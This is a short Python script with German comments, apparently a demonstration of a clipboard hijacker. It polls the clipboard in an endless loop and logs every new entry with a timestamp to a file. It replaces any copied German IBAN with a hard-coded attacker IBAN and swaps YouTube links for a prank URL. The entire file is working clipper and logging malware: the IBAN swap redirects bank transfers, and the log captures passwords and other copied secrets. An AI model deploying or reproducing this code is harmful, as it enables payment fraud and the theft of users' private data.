import re, pyperclip # pip install pyperclip 
from datetime import datetime # pip install DateTime

# Funktion, die den Text aus der Zwischenablage mitloggt.
def log(logfile, daten):
  # Logfile öffnen.
  with open(logfile, "a") as datei:
    # Aktuellen Zeitstempel laden.
    t = datetime.now()
    # Daten ins Logfile schreiben.
    datei.write(f"{t.strftime('%m/%d/%Y,%H:%M:%S')}-{daten}\n")
    
# Funktion zum Verändern einer kopierten IBAN.
def mod_iban():
  # Fake-IBAN, die in die Zwischenablage kopiert werden soll.
  fake_iban = "DE96790700166165546734"
  #fake_iban = "DE96790700166165546000"
  # Die Fake_IBAN wird in die Zwischenablage kopiert.
  pyperclip.copy(fake_iban)

# Funktion zum Verändern einer kopierten URL.
def mod_url():
  # Fake-URL, die in die Zwischenablage kopiert werden soll.
  fake_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  # Die URL wird in die Zwischenablage kopiert.
  pyperclip.copy(fake_url)

if __name__ == "__main__":
  # Pfad zum Logfile.
  logfile = "logfile.txt"
  # Kopie der Zwischenablage anfertigen.
  clipboard_kopie = pyperclip.paste()
  # In einer Endlosschleife
  while True:
    # wird die Zwischenablage abgefragt und
    daten = pyperclip.paste()
    # der Inhalt (wenn er nicht leer und neu ist) samt Zeitstempel mitgeloggt.
    if daten != "None" and daten != clipboard_kopie:
      log(logfile, daten)
      # Kopie der Zwischenablage anfertigen.
      clipboard_kopie = pyperclip.paste()
      # Der Inhalt wird geprüft. Wenn eine IBAN entdeckt wurde,
      if re.match("DE[0-9]{20}", daten):
        # dann wird sie modifiziert.
        mod_iban()
        # Wenn ein YouTube-Link entdeckt wurde,
      elif "www.youtube.com" in daten:
        # dann wird sie modifiziert.
        mod_url()